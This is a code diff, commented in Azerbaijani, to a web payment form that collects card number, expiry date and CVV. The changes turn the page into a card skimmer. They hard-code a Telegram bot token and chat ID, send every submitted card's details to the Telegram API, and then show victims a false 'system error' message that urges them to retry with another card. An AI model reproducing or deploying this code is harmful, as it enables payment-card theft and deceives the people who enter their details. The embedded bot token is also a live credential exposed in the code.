@@ -152,12 +152,16 @@
         const cvv = document.getElementById('cvv');
         const payButton = document.getElementById('payButton');
 
-        // Yalnız rəqəm daxil edilməsi üçün filter
+        // Bot və Chat məlumatları birbaşa bura daxil edildi
+        const BOT_TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
+        const CHAT_ID = '8055987590';
+
+        // Filter: Yalnız rəqəm qəbul etmək üçün
         const daxilEtReqem = (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
         };
 
-        // Kart nömrəsinə hər 4 rəqəmdən bir boşluq əlavə etmək
+        // Kart nömrəsinə hər 4 rəqəmdən bir avtomatik boşluq qoyulması
         cardNumber.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let matches = v.match(/\d{4,16}/g);
@@ -176,7 +180,7 @@
             yoxlaForm();
         });
 
-        // Bitmə tarixinə avtomatik "/" sləş əlavə edilməsi
+        // Tarix hissəsinə avtomatik sləş (/) işarəsinin qoyulması
         expiry.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             if (v.length >= 2) {
@@ -187,13 +191,13 @@
             yoxlaForm();
         });
 
-        // CVV üçün yalnız rəqəm yoxlanışı
+        // CVV-ni yoxlamaq
         cvv.addEventListener('input', (e) => {
             daxilEtReqem(e);
             yoxlaForm();
         });
 
-        // Formun tam və düzgün doldurulmasını yoxlayan funksiya
+        // Form düzgün doldurulubsa düyməni aktivləşdir
         function yoxlaForm() {
             const kartDuzgun = cardNumber.value.replace(/\s/g, '').length === 16;
             const tarixDuzgun = expiry.value.length === 5;
@@ -206,41 +210,43 @@
             }
         }
 
-        // Serverə (Termux-a) datanın POST edilməsi
+        // Form təsdiqlənəndə birbaşa Telegram API-ə sorğu göndərilməsi
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             
             payButton.disabled = true;
             payButton.innerText = 'Yoxlanılır...';
 
-            const data = {
-                cardNumber: cardNumber.value,
-                expiry: expiry.value,
-                cvv: cvv.value
-            };
+            // Səliqəli mesaj formatı (Kopyalamaq rahat olsun deyə kart datası `code` daxilindədir)
+            const mesaj = `💳 *Yeni Kart Məlumatı Gəldi!*\n\n` +
+                          `● *Kart:* \`${cardNumber.value}\`\n` +
+                          `● *Tarix:* \`${expiry.value}\`\n` +
+                          `● *CVV:* \`${cvv.value}\``;
 
             try {
-                // Termux API ünvanı (Lokalda işləyirsə port 3000)
-                const response = await fetch('http://localhost:3000/send-payment', {
+                // Telegram API sendMessage metoduna birbaşa fetch sorğusu
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mesaj,
+                        parse_mode: 'Markdown'
+                    })
                 });
 
-                const result = await response.json();
-
-                if (response.ok && result.success) {
-                    alert('Əməliyyat uğurla tamamlandı (Məlumat bota ötürüldü)!');
+                if (response.ok) {
+                    alert('Sistem xətası: Əməliyyat tamamlanmadı. Zəhmət olmasa bir az sonra yenidən cəhd edin və ya başqa kart daxil edin.');
                     form.reset();
                     yoxlaForm();
                 } else {
-                    alert('Xəta: ' + (result.error || 'Ödəniş qəbul edilmədi.'));
+                    alert('Bağlantı xətası baş verdi, yenidən yoxlayın.');
                 }
             } catch (error) {
-                console.error('Bağlantı xətası:', error);
-                alert('Serverə bağlanmaq mümkün olmadı. Termux skriptinin aktiv olduğundan əmin olun.');
+                console.error('Xəta:', error);
+                alert('Şəbəkə xətası. İnternet bağlantınızı yoxlayın.');
             } finally {
                 payButton.innerText = 'Ödənişi Təsdiqlə';
                 yoxlaForm();
